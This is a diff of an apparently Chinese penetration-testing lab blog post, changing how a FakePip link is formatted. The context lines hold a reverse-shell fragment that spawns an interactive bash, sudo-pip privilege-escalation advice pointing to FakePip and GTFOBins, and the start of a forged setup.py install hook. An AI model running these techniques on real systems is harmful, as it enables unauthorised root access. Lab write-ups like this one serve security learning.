@@ -256,8 +256,7 @@ p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])
 <p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/14.png" alt="img"></p>
 <p>接着尝试能否将devops用户提权<code>root</code>，<code>sudo -l</code>查</p>
 <p><img src="https://pub-624516a8d051462080df06b1964d2889.r2.dev/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0%2001/15.png" alt="img"></p>
-<p><code>pip</code>命令是<code>NOPASSWD</code>的，可以使用<a target="_blank" rel="noopener" href="https://github.com/0x00-0x00/FakePip%60fakepip%60%E6%89%93%EF%BC%8C%E4%BC%AA%E9%80%A0%60setup.py%60">https://github.com/0x00-0x00/FakePip`fakepip`打，伪造`setup.py`</a></p>
-<p>另外如果需要使用别的命令提权可以来这儿找找<a target="_blank" rel="noopener" href="https://gtfobins.github.io/#">https://gtfobins.github.io/#</a></p>
+<p><code>pip</code>命令是<code>NOPASSWD</code>的，可以使用<a target="_blank" rel="noopener" href="https://github.com/0x00-0x00/FakePip">https://github.com/0x00-0x00/FakePip</a><br><code>fakepip</code>打，伪造<code>setup.py</code><br>另外如果需要使用别的命令提权可以来这儿找找<a target="_blank" rel="noopener" href="https://gtfobins.github.io/#">https://gtfobins.github.io/#</a></p>
 <pre><code class="Python">from setuptools import setup
 from setuptools.command.install import install
 import base64
